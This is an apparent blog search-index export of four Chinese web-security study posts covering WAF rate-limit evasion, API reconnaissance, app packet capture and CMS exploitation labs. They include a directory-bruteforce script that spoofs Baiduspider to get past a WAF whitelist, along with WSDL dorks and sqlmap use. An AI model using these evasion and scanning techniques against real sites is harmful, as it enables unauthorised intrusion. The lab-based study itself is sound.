<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>wen安全日志-046</title>
      <link href="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/"/>
      <url>/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-信息收集之反爬虫延时代理池技术"><a href="#WEB漏洞-信息收集之反爬虫延时代理池技术" class="headerlink" title="WEB漏洞-信息收集之反爬虫延时代理池技术"></a><font size="6"><strong>WEB漏洞-信息收集之反爬虫延时代理池技术</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p>WAF拦截会出现在安全测试的各个层面，掌握各个层面的分析和绕过技术最为关键。<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/1.png"></p><h3 id="二、演示案例"><a href="#二、演示案例" class="headerlink" title="二、演示案例"></a><font size="5"><strong>二、演示案例</strong></font></h3><p><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/2.png"></p><h4 id="1、Safedog-未开CC"><a href="#1、Safedog-未开CC" class="headerlink" title="1、Safedog-未开CC"></a><font size="4"><strong>1、Safedog-未开CC</strong></font></h4><p>CC就是DDOS攻击的一种，默认是不开启的。<br>判断有没有WAF可以直接在路径上报错显示。</p><h4 id="①用目录扫描工具扫"><a href="#①用目录扫描工具扫" class="headerlink" title="①用目录扫描工具扫"></a><font size="4"><strong>①用目录扫描工具扫</strong></font></h4><p><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/3.png"></p><p>扫出来的目录全是假的。<br>使用抓取进程的抓包工具抓包<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/4.png"></p><p>可以很明显的看出不同，在请求方法上就不同。可以修改为Get方式。<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/5.png"></p><p>这回就没有误报了。<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/6.png"></p><h4 id="2、Safedog-开启CC"><a href="#2、Safedog-开启CC" class="headerlink" title="2、Safedog-开启CC"></a><font size="4"><strong>2、Safedog-开启CC</strong></font></h4><p><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/7.png"></p><p>开启CC之后，再次使用工具，并且访问网站。<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/8.png"></p><p>访问速度过快了。可以设置延迟扫描。<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/9.png"></p><p>或者也可以通过爬虫的白名单来搞<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/10.png"></p><p>模拟搜索引擎请求头User-Agent就可以了。进行扫描<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/11.png"></p><p>发现没有任何的结果。</p><h4 id="①使用python脚本来访问"><a href="#①使用python脚本来访问" class="headerlink" title="①使用python脚本来访问"></a><font size="4"><strong>①使用python脚本来访问</strong></font></h4><p><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/12.png"><br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/13.png"></p><p>php_b.txt是一个字典</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> requests<span class="token function">import</span> <span class="token function">time</span>headers <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token string">'Accept'</span><span class="token keyword">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'</span>,    <span class="token string">'Accept-Encoding'</span><span class="token keyword">:</span> <span class="token string">'gzip, deflate, br'</span>,    <span class="token string">'Accept-Language'</span><span class="token keyword">:</span> <span class="token string">'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'</span>,    <span class="token string">'Cache-Control'</span><span class="token keyword">:</span> <span class="token string">'max-age=0'</span>,    <span class="token string">'Connection'</span><span class="token keyword">:</span> <span class="token string">'keep-alive'</span>,    <span class="token string">'Cookie'</span><span class="token keyword">:</span> <span class="token string">'PHPSESSID=4d6f9bc8de5e7456fd24d60d2dfd5e5a'</span>,    <span class="token string">'sec-ch-ua'</span><span class="token keyword">:</span> <span class="token string">'"Chromium";v="92", " Not A;Brand";v="99", "Microsoft Edge";v="92"'</span>,    <span class="token string">'sec-ch-ua-mobile'</span><span class="token keyword">:</span> <span class="token string">'?0'</span>,    <span class="token string">'Sec-Fetch-Dest'</span><span class="token keyword">:</span> <span class="token string">'document'</span>,    <span class="token string">'Sec-Fetch-Mode'</span><span class="token keyword">:</span> <span class="token string">'navigate'</span>,    <span class="token string">'Sec-Fetch-Site'</span><span class="token keyword">:</span> <span class="token string">'none'</span>,    <span class="token string">'Sec-Fetch-User'</span><span class="token keyword">:</span> <span class="token string">'?1'</span>,    <span class="token string">'Upgrade-Insecure-Requests'</span><span class="token keyword">:</span> <span class="token string">'1'</span>,    <span class="token string">'User-Agent'</span><span class="token keyword">:</span> <span class="token string">'Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)'</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">for</span> paths <span class="token keyword">in</span> open<span class="token punctuation">(</span><span class="token string">'php_b.txt'</span>, encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>:    url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/pikachu"</span>    paths <span class="token operator">=</span> paths.replace<span class="token punctuation">(</span><span class="token string">'\n'</span>, <span class="token string">''</span><span class="token punctuation">)</span>    urls <span class="token operator">=</span> url + paths    proxy <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token string">'http'</span><span class="token keyword">:</span> <span class="token string">'127.0.0.1:7777'</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    try:        code <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>urls, headers<span class="token operator">=</span>headers, proxies<span class="token operator">=</span>proxy<span class="token punctuation">)</span>.status_code        <span class="token comment" spellcheck="true"># time.sleep(3)</span>        print<span class="token punctuation">(</span>urls + <span class="token string">'|'</span> + str<span class="token punctuation">(</span>code<span class="token punctuation">))</span>    except Exception as err:        print<span class="token punctuation">(</span><span class="token string">'connect error'</span><span class="token punctuation">)</span>        time.sleep<span class="token punctuation">(</span>3<span class="token punctuation">)</span></code></pre><p><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/14.png"></p><p>抓包分析：<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/15.png"></p><p>如果不用自定义头：<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/16.png"></p><p>可以直接在脚本里使用爬虫引擎的请求头，效果很好。<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/17.png"></p><h4 id="②代理池"><a href="#②代理池" class="headerlink" title="②代理池"></a><font size="4"><strong>②代理池</strong></font></h4><p><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/18.png"></p><h4 id="3、阿里云"><a href="#3、阿里云" class="headerlink" title="3、阿里云"></a><font size="4"><strong>3、阿里云</strong></font></h4><p>阿里云-无法模拟搜索引擎爬虫绕过，只能采用代理池或者延时。</p><h4 id="4、阿里云-宝塔付费安全服务"><a href="#4、阿里云-宝塔付费安全服务" class="headerlink" title="4、阿里云+宝塔付费安全服务"></a><font size="4"><strong>4、阿里云+宝塔付费安全服务</strong></font></h4><p><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/19.png"></p><p>通过延时来搞：<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/20.png"></p><p>宝塔里的日志：<br><img src="/2023/10/29/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-046/21.png"></p><p>可以优化日志，因为宝塔检测出一分钟内访问敏感文件了。比如说code.php.bak 可以优化成code.php.bak .访问的还是原来的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wen安全日志-045</title>
      <link href="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/"/>
      <url>/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-API-接口服务之漏洞探针类型利用修复"><a href="#WEB漏洞-API-接口服务之漏洞探针类型利用修复" class="headerlink" title="WEB漏洞-API 接口服务之漏洞探针类型利用修复"></a><font size="6"><strong>WEB漏洞-API 接口服务之漏洞探针类型利用修复</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/1.png"></p><h3 id="二、测试思路"><a href="#二、测试思路" class="headerlink" title="二、测试思路"></a><font size="5"><strong>二、测试思路</strong></font></h3><pre class=" language-bash"><code class="language-bash">信息收集之信息利用第一步：首先识别网站是否有cdn，waf等产品，有则绕过。第二步：扫描收集到网站的端口信息，真实ip地址，ip绑定的其他域名。第三步：网站敏感路径扫描第四步：域名+端口敏感信息扫描第五步：ip+端口敏感目录扫描备注：字典不应该只是敏感路径，还应该有备份文件 <span class="token function">zip</span> <span class="token function">rar</span> <span class="token function">tar</span> tar.gz等格式文件</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#端口服务类安全测试</span>根据前期信息收集针对目标端口服务类探针后进行的安全测试，主要涉及攻击方法：口令安全，WEB类漏洞，版本漏洞等，其中产生的危害可大可小。属于端口服务/第三方服务类安全测试面。一般在已知应用无思路的情况下选用的安全测试方案。<span class="token comment" spellcheck="true">#API 接口-WebServiceRESTful API</span>https://xz.aliyun.com/t/2412根据应用自身的功能方向决定，安全测试目标需有 API 接口调用才能进行此类测试，主要涉及的安全问题：自身安全，配合 WEB，业务逻辑等，其中产生的危害可大可小，属于应用 API 接口网络服务测试面，一般也是在存在接口调用的情况下的测试方案。WSDL（网络服务描述语言，Web Services Description Language）是一门基于 XML 的语言，用于描述Web Services 以及如何对它们进行访问。<span class="token comment" spellcheck="true">#漏洞关键字：</span>配合 shodan，fofa,zoomeye 搜索也不错哦~inurl:jws?wsdlinurl:asmx?wsdlinurl:aspx?wsdlinurl:ascx?wsdlinurl:ashx?wsdlinurl:dll?wsdlinurl:exe?wsdlinurl:php?wsdlinurl:pl?wsdlinurl:?wsdlfiletype:wsdl wsdlhttp://testaspnet.vulnweb.com/acuservice/service.asmx?WSDL</code></pre><p><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/2.png"></p><h3 id="三、演示案例"><a href="#三、演示案例" class="headerlink" title="三、演示案例"></a><font size="5"><strong>三、演示案例</strong></font></h3><h4 id="1、域名信息收集"><a href="#1、域名信息收集" class="headerlink" title="1、域名信息收集"></a><font size="4"><strong>1、域名信息收集</strong></font></h4><p><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/3.png"></p><p>收集测试目标<br>域名访问和IP访问，目录可能会不同：<br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/4.png"></p><p>收集时候不仅要扫描域名下的目录，还得扫描ip地址下的。<br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/5.png"></p><h4 id="2、Goby端口扫描"><a href="#2、Goby端口扫描" class="headerlink" title="2、Goby端口扫描"></a><font size="4"><strong>2、Goby端口扫描</strong></font></h4><p><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/6.png"></p><p>也可以用Nmap。</p><h4 id="3、超级弱口令检测工具"><a href="#3、超级弱口令检测工具" class="headerlink" title="3、超级弱口令检测工具"></a><font size="4"><strong>3、超级弱口令检测工具</strong></font></h4><p>下载地址：<br><a href="https://github.com/shack2/SNETCracker/releases">https://github.com/shack2/SNETCracker/releases</a> <a href="https://www.uedbox.com/post/57215/">https://www.uedbox.com/post/57215/</a><br>界面：</p><p><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/7.png"></p><p>前提是要支持外链，如果对方数据库是在内网，那就不行了。</p><h3 id="四、网络服务"><a href="#四、网络服务" class="headerlink" title="四、网络服务"></a><font size="5"><strong>四、网络服务</strong></font></h3><p><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/8.png"></p><h4 id="WDSL语言"><a href="#WDSL语言" class="headerlink" title="WDSL语言"></a><font size="4"><strong>WDSL语言</strong></font></h4><p><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/9.png"></p><p>①API接口测试<br>xz.aliyun.com&#x2F;t&#x2F;2412 </p><h4 id="AWVS扫描"><a href="#AWVS扫描" class="headerlink" title="AWVS扫描"></a><font size="4"><strong>AWVS扫描</strong></font></h4><p><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/10.png"></p><p>扫描出来的结果又SQL注入漏洞<br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/11.png"></p><p>把数据包复制一下，在sqlmap安装目录，新建一个文档<br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/12.png"></p><p>将数据包复制进去。<br>但是注意要把测试语句给删掉。<br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/13.png"><br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/14.png"></p><p>sqlmap<br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/15.png"></p><p>–batch就是遇到yes or no的时候全部yes<br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/16.png"></p><p>列出表单<br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/17.png"><br><img src="/2023/10/28/wen%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-045/18.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-044</title>
      <link href="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/"/>
      <url>/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-APP-应用之漏洞探针类型利用修复"><a href="#WEB漏洞-APP-应用之漏洞探针类型利用修复" class="headerlink" title="WEB漏洞-APP 应用之漏洞探针类型利用修复"></a><font size="6"><strong>WEB漏洞-APP 应用之漏洞探针类型利用修复</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/1.png"></p><h3 id="二、思路"><a href="#二、思路" class="headerlink" title="二、思路"></a><font size="5"><strong>二、思路</strong></font></h3><pre class=" language-bash"><code class="language-bash">反编译提取 URL 或抓包获取 URL，进行 WEB 应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试！<span class="token comment" spellcheck="true">#APP->WEB APP->其他 APP->逆向</span><span class="token comment" spellcheck="true">#WEB 抓包，其他协议抓包演示及说明</span><span class="token comment" spellcheck="true">#未逆向层面进行抓包区分各协议测试</span><span class="token comment" spellcheck="true">#逆向层面进行提取 APK 代码层面数据</span><span class="token comment" spellcheck="true">#https://www.cnblogs.com/L0ading/p/12388928.html</span></code></pre><h3 id="三、案例演示"><a href="#三、案例演示" class="headerlink" title="三、案例演示"></a><font size="5"><strong>三、案例演示</strong></font></h3><pre class=" language-bash"><code class="language-bash">抓包工具WEB协议面使用说明抓包工具非WEB协议面使用说明安卓逆向便捷APK一键提取URL演示利用Burp筛选及联动功能打出军体拳模拟器四个违法案例APP安全分析测试</code></pre><h4 id="1、抓包工具WEB协议面使用说明"><a href="#1、抓包工具WEB协议面使用说明" class="headerlink" title="1、抓包工具WEB协议面使用说明"></a><font size="4"><strong>1、抓包工具WEB协议面使用说明</strong></font></h4><p><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/2.png"></p><p>配置<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/3.png"></p><p>打开和妹妹吃西瓜聊天的app，登录后随便点一点，看一<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/4.png"></p><h4 id="2、茶杯Charles抓包工具"><a href="#2、茶杯Charles抓包工具" class="headerlink" title="2、茶杯Charles抓包工具"></a><font size="4"><strong>2、茶杯Charles抓包工具</strong></font></h4><p><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/5.png"></p><p>主要是获取url<br>电脑访问，被拦截：<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/6.png"></p><p>那就用安卓模拟器，抓下包，对比两种包有啥不同，进行伪造就完事了。<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/7.png"></p><h4 id="3、抓包精灵"><a href="#3、抓包精灵" class="headerlink" title="3、抓包精灵"></a><font size="4"><strong>3、抓包精灵</strong></font></h4><p><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/8.png"><br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/9.png"></p><h4 id="4、Wireshark抓包"><a href="#4、Wireshark抓包" class="headerlink" title="4、Wireshark抓包"></a><font size="4"><strong>4、Wireshark抓包</strong></font></h4><p>其他的抓包软件可能只会抓HTTP比较鸡肋，可以用Wireshark捕获网络接口。各种协议都有了。</p><h4 id="5、安卓逆向便捷APK一键提取URL演示"><a href="#5、安卓逆向便捷APK一键提取URL演示" class="headerlink" title="5、安卓逆向便捷APK一键提取URL演示"></a><font size="4"><strong>5、安卓逆向便捷APK一键提取URL演示</strong></font></h4><p><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/10.png"></p><p>反编译后：<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/11.png"><br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/12.png"></p><h4 id="6、利用Burp筛选及联动功能打出军体拳"><a href="#6、利用Burp筛选及联动功能打出军体拳" class="headerlink" title="6、利用Burp筛选及联动功能打出军体拳"></a><font size="4"><strong>6、利用Burp筛选及联动功能打出军体拳</strong></font></h4><p>联动Xray或awvs<br>打开powershell，使用webscan 监听6666端口<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/13.png"></p><p>在burp里设置<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/14.png"></p><p>模拟器这里配置到burp<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/15.png"></p><h3 id="然后burp就转发到xray那里"><a href="#然后burp就转发到xray那里" class="headerlink" title="然后burp就转发到xray那里"></a><font size="5"><strong>然后burp就转发到xray那里</strong></font></h3><h3 id="四、wireshark过滤器"><a href="#四、wireshark过滤器" class="headerlink" title="四、wireshark过滤器"></a><font size="5"><strong>四、wireshark过滤器</strong></font></h3><pre class=" language-bash"><code class="language-bash">过滤源ip、目的ip。在wireshark的过滤规则框Filter中输入过滤条件。如查找目的地址为192.168.101.8的包，ip.dst<span class="token operator">==</span>192.168.101.8；查找源地址为ip.src<span class="token operator">==</span>1.1.1.1端口过滤。如过滤80端口，在Filter中输入，tcp.port<span class="token operator">==</span>80，这条规则是把源端口和目的端口为80的都过滤出来。使用tcp.dstport<span class="token operator">==</span>80只过滤目的端口为80的，tcp.srcport<span class="token operator">==</span>80只过滤源端口为80的包协议过滤比较简单，直接在Filter框中直接输入协议名即可，如过滤HTTP的协议http模式过滤。如过滤get包，http.request.method<span class="token operator">==</span><span class="token string">"GET"</span>,过滤post包，http.request.method<span class="token operator">==</span><span class="token string">"POST"</span>连接符and的使用。过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，ip.src<span class="token operator">==</span>192.168.101.8 and http。</code></pre><p>工作中，一些使用方式<br>调整时间格式<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/16.png"></p><p> 然后再排序下。根据时间字段<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/17.png"></p><p>根据端口过滤<br>服务端端口是7018，和客户端建立socket连接，根据服务端的端口找到2者通信的所有socket数据（客户端进入房间后会异常断开，判断是客户端导致的还是服务端导致的）<br>tcp.port&#x3D;&#x3D;7018，最后的RST报文是服务端发起的，说明是服务端主动断开的，缩小问题范围<br><img src="/2023/10/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-044/18.png"></p><p>仅从抓包信息看是服务器的一个流量控制机制启动了。服务器发回rst位，同时win置为0，是告诉客户端不要发包。按tcp流控机制来说，此时客户端<br>应该停止发包，直至服务器发送信息告诉客户端可以继续发送。</p><pre class=" language-bash"><code class="language-bash">TCP连接:SYN ACK RST UTG PSH FIN三次握手：发送端发送一个SYN<span class="token operator">=</span>1，ACK<span class="token operator">=</span>0标志的数据包给接收端，请求进行连接，这是第一次握手；接收端收到请求并且允许连接的话，就会发送一个SYN<span class="token operator">=</span>1，ACK<span class="token operator">=</span>1标志的数据包给发送端，告诉它，可以通讯了，并且让发送端发送一个确认数据包，这是第二次握手；最后，发送端发送一个SYN<span class="token operator">=</span>0，ACK<span class="token operator">=</span>1的数据包给接收端，告诉它连接已被确认，这就是第三次握手。之后，一个TCP连接建立，开始通讯。 *SYN：同步标志同步序列编号<span class="token punctuation">(</span>Synchronize Sequence Numbers<span class="token punctuation">)</span>栏有效。该标志仅在三次握手建立TCP连接时有效。它提示TCP连接的服务端检查序列编号，该序列编号为TCP连接初始端<span class="token punctuation">(</span>一般是客户端<span class="token punctuation">)</span>的初始序列编号。在这里，可以把 TCP序列编号看作是一个范围从0到4，294，967，295的32位计数器。通过TCP连接交换的数据中每一个字节都经过序列编号。在TCP报头中的序列编号栏包括了TCP分段中第一个字节的序列编号。*ACK：确认标志确认编号<span class="token punctuation">(</span>Acknowledgement Number<span class="token punctuation">)</span>栏有效。大多数情况下该标志位是置位的。TCP报头内的确认编号栏内包含的确认编号<span class="token punctuation">(</span>w+1，Figure-1<span class="token punctuation">)</span>为下一个预期的序列编号，同时提示远端系统已经成功接收所有数据。*RST：复位标志复位标志有效。用于复位相应的TCP连接。*URG：紧急标志紧急<span class="token punctuation">(</span>The urgent pointer<span class="token punctuation">)</span> 标志有效。紧急标志置位，*PSH：推标志该标志置位时，接收端不将该数据进行队列处理，而是尽可能快将数据转由应用处理。在处理 telnet 或 rlogin 等交互模式的连接时，该标志总是置位的。*FIN：结束标志带有该标志置位的数据包用来结束一个TCP回话，但对应端口仍处于开放状态，准备接收后续数据。TCP的几个状态对于我们分析所起的作用。在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.其中，对于我们日常的分析有用的就是前面的五个字段。它们的含义是：SYN表示建立连接，FIN表示关闭连接，ACK表示响应，PSH表示有 DATA数据传输，RST表示连接重置。其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，如果只是单个的一个SYN，它表示的只是建立连接。TCP的几次握手就是通过这样的ACK表现出来的。但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。PSH为1的情况，一般只出现在DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。TCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。 </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-043</title>
      <link href="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/"/>
      <url>/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-WEB-应用之漏洞探针类型利用修复"><a href="#WEB漏洞-WEB-应用之漏洞探针类型利用修复" class="headerlink" title="WEB漏洞-WEB 应用之漏洞探针类型利用修复"></a><font size="6"><strong>WEB漏洞-WEB 应用之漏洞探针类型利用修复</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/1.png"></p><h3 id="二、站点判断"><a href="#二、站点判断" class="headerlink" title="二、站点判断"></a><font size="5"><strong>二、站点判断</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#已知 CMS</span>如常见的 dedecms.discuz,wordpress 等源码结构，这种一般采用非框架类开发，但也有少部分采用的是框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用白盒代码审计自行挖掘。<span class="token comment" spellcheck="true">#开发框架</span>如常见的 thinkphp，spring,flask 等开发的源码程序，这种源码程序正常的安全测试思路：先获取对应的开发框架信息<span class="token punctuation">(</span>名字，版本<span class="token punctuation">)</span>，通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审计自行挖掘。<span class="token comment" spellcheck="true">#未知 CMS</span>如常见的企业或个人内部程序源码，也可以是某 CMS 二次开发的源码结构，针对此类的源码程序测试思路：能识别二次开发就按已知 CMS 思路进行，不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以进行代码审计自行挖掘。</code></pre><h3 id="三、涉及资源"><a href="#三、涉及资源" class="headerlink" title="三、涉及资源"></a><font size="5"><strong>三、涉及资源</strong></font></h3><pre class=" language-bash"><code class="language-bash">涉及资源：https://vulhub.org/https://wpvulndb.com/users/sign_uphttps://github.com/wpscanteam/wpscanhttps://github.com/ajinabraham/CMSScanhttps://pan.baidu.com/s/1KCa-5gU8R8jPXYY19vyvZA 提取码：xiaohttps://www.mozhe.cn/bug/detail/S0JTL0F4RE1sY2hGdHdwcUJ6aUFCQT09bW96aGUmozhe</code></pre><h3 id="四、CVE-2018-1273"><a href="#四、CVE-2018-1273" class="headerlink" title="四、CVE-2018-1273"></a><font size="5"><strong>四、CVE-2018-1273</strong></font></h3><pre class=" language-bash"><code class="language-bash">$ <span class="token function">cd</span> spring/CVE-2018-1273$ docker-compose up -d</code></pre><p><a href="https://vulhub.org/#/environments/spring/CVE-2018-1273/">https://vulhub.org/#/environments/spring/CVE-2018-1273/</a><br><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/2.png"></p><pre class=" language-bash"><code class="language-bash">root@a644ddd591a3:/<span class="token comment" spellcheck="true"># ls /tmp/success</span>/tmp/success</code></pre><h3 id="五、演示案例"><a href="#五、演示案例" class="headerlink" title="五、演示案例"></a><font size="5"><strong>五、演示案例</strong></font></h3><p>开发框架类源码渗透测试报告-资讯-thinkphp,spring<br>已知 CMS 非框架类渗透测试报告-工具脚本-wordpress<br>已知 CMS 非框架类渗透测试报告-代码审计-qqyewu_php<br>未知 CMS 非框架类渗透测试报告-人工-你我都爱的 wg 哦~</p><h4 id="1、已知CMS非框架类–WordPress"><a href="#1、已知CMS非框架类–WordPress" class="headerlink" title="1、已知CMS非框架类–WordPress"></a><font size="4"><strong>1、已知CMS非框架类–WordPress</strong></font></h4><p>墨者靶场：<br><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/3.png"><br><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/4.png"></p><p>首先上来，不知道是啥cms，识别。但是这里已经提示。或者也可以从数据包中来找一些线索。<br>可以用wpscan工具，或者对应的cms的工具来测试使用。<br>网址：<br>wpscan.org <a 